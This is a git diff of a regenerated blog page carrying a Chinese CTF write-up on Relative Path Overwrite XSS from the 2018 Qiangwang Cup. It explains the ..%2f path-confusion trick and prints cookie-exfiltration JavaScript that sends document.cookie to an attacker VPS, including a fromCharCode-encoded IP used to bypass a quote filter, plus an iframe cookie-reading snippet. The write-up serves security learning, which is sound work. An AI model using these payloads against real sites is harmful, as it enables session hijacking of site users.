@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://ph0rse.me">
   <title>RPO | Ph0rse&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -52,7 +52,7 @@
   
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -202,22 +202,22 @@
 <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通过这次强网杯，见识到了RPO这种漏洞，也是在畅师傅的指导下，学习了一波，写篇文章记录一下~</p>
 <p>RPO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。</p>
 <h3 id="Fuck-the-“Share-your-mind”"><a href="#Fuck-the-“Share-your-mind”" class="headerlink" title="Fuck the “Share your mind”"></a>Fuck the “Share your mind”</h3><p>这是18-03-24强网杯的一道题，也是从这里开始接触RPO这个漏洞，以下简单介绍一下这道题的做法:<br>首先就是一个登录界面</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251627_322.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251627_322.png" alt></p>
 <p>简单测试后可以发现并没有SQL注入或者XSS漏洞，之后注册一个账号，登录进去。测试各个页面，还是没有发现SQL注入<br>在做比赛的小伙伴可能会对以下这个页面很熟悉：</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251629_161.png" alt=""><br>没错，就是这个“脸上”写着“这里有FLAG”的页面，而且如果在Reports框里输入<code>http://39.107.33.96:20000/&lt;script src=http://VPSIP &gt;&lt;/script&gt;</code>，它真的会访问我们自己的VPS，结合第一个提示：</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251639_571.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251629_161.png" alt><br>没错，就是这个“脸上”写着“这里有FLAG”的页面，而且如果在Reports框里输入<code>http://39.107.33.96:20000/&lt;script src=http://VPSIP &gt;&lt;/script&gt;</code>，它真的会访问我们自己的VPS，结合第一个提示：</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251639_571.png" alt></p>
 <p>再联想到i春秋的一篇<a href="https://bbs.ichunqiu.com/thread-24786-1-1.html?from=bkyl" target="_blank" rel="noopener">文章</a><br>通过反调PhantomJS XSS bot 把XSS漏洞升级为SSRF/LFR</p>
 <p>惊不惊喜？意不意外？是不是感觉从此拿到FLAG，出任CEO，迎娶白富美，从此走上人生巅峰了？</p>
 <p>呵~想！多！了！</p>
 <p>不知道为什么，VPS上的js代码就是没办法执行</p>
 <p>之后才了解到，真正的漏洞点在这里：</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251645_841.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251645_841.png" alt></p>
 <p>。。。</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251647_432.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251647_432.png" alt></p>
 <p>也就是我们今天要介绍的主角，RPO导致的XSS漏洞了……</p>
-<h3 id="phpinfo-url-模式"><a href="#phpinfo-url-模式" class="headerlink" title="phpinfo url 模式"></a>phpinfo url 模式</h3><p>在看漏洞流程之前，我们先介绍一个知识点，就是按照目录方式获取资源，以及phpinfo URL模式。<br><code>http://39.107.33.96:20000/index.php/view/article/763</code><br>难道有一个目录交index.php吗？不是的，它使用了url rewrite的php开发框架，也叫PHPINFO URL模式<br>等价于<br><code>http://39.107.33.96:20000/index.php?mod=view&amp;article=763</code><br>在这道题里，返回的，就是我们输入的文章内容，当标题为空时，只返回内容的纯文本，不包含html代码。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803261259_304.png" alt=""></p>
+<h3 id="phpinfo-url-模式"><a href="#phpinfo-url-模式" class="headerlink" title="phpinfo url 模式"></a>phpinfo url 模式</h3><p>在看漏洞流程之前，我们先介绍一个知识点，就是按照目录方式获取资源，以及phpinfo URL模式。<br><code>http://39.107.33.96:20000/index.php/view/article/763</code><br>难道有一个目录交index.php吗？不是的，它使用了url rewrite的php开发框架，也叫PHPINFO URL模式<br>等价于<br><code>http://39.107.33.96:20000/index.php?mod=view&amp;article=763</code><br>在这道题里，返回的，就是我们输入的文章内容，当标题为空时，只返回内容的纯文本，不包含html代码。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803261259_304.png" alt></p>
 <h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>文章最开始提到过，RPO漏洞就是“相对路径覆盖”，而这道题的漏洞产生，也是因为相对路径</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261525_251.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261525_251.png" alt></p>
 <p>我们来分析一下上面导致漏洞的payload</p>
 <p><code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php</code></p>
 <p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</p>
@@ -228,17 +228,17 @@
 <p>浏览器错误理解url后，请求相对路径中请求的资源路径，就变成了<code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code></p>
 <p>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>
 <p>读到<code>..%2f..%2f..%2f..%2findex.php</code>这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<code>http://39.107.33.96:20000/index.php/view/article/36967/</code></p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251723_122.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251723_122.png" alt></p>
 <p>我们看网络里的请求，也可以看到浏览器按照phpinfo的格式来解析url的话，只会访问到能识别的地方</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251728_264.png" alt=""><br>这里要注意，xxxdir只是为了表示这是一个没有用的dir，换成aaadir效果也是一样的，同理把<code>..%2f..%2f..%2f..%2findex.php</code>当做dir也是一样的。</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251728_264.png" alt><br>这里要注意，xxxdir只是为了表示这是一个没有用的dir，换成aaadir效果也是一样的，同理把<code>..%2f..%2f..%2f..%2findex.php</code>当做dir也是一样的。</p>
 <p>把<code>http://39.107.33.96:20000/index.php/view/article/36967/</code>的页面内容，也就是<code>alert(1)</code>当做是js文件的内容，带回到了<code>&lt;script&gt;</code>标签中，也就因此，造成了XSS漏洞</p>
-<p>漏洞完成过程<br>首先填写一个只有内容，没有标题的Ideas<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803251734_133.png" alt=""></p>
+<p>漏洞完成过程<br>首先填写一个只有内容，没有标题的Ideas<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803251734_133.png" alt></p>
 <p>如果标题不为空</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_961.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_961.png" alt></p>
 <p>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常。</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_975.png" alt=""></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_975.png" alt></p>
 <p>之后我们就可以伪造请求，比如<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code><br>由于漏洞点过滤了引号，所以可以用fromCharCode进行绕过处理<br>(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,53,52,46,50,51,53,46,50,51,52,46,54,56,58,50,51,51,47)+document.cookie;</p>
-<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261433_906.png" alt=""><br>写这篇文章的时候，后台的自动点击脚本貌似没在运行了，只能我自己触发一下xss，弹个自己的PHPSESSION回来。比赛过程中会有个提示，让你去打二级目录<code>/QWB_fl4g/QWB/</code></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261433_906.png" alt><br>写这篇文章的时候，后台的自动点击脚本貌似没在运行了，只能我自己触发一下xss，弹个自己的PHPSESSION回来。比赛过程中会有个提示，让你去打二级目录<code>/QWB_fl4g/QWB/</code></p>
 <p>然后使用iframe标签去读二级目录下的cookie</p>
 <pre><code>iframe
 var iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101));
@@ -484,7 +484,7 @@ gitment.render('gitment-ctn')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 Ph0rse
+    		&copy; 2019 Ph0rse
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -592,7 +592,7 @@ MathJax.Hub.Queue(function() {
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            缺失模块。<br>1、请确保node版本大于6.2<br>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
             3、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
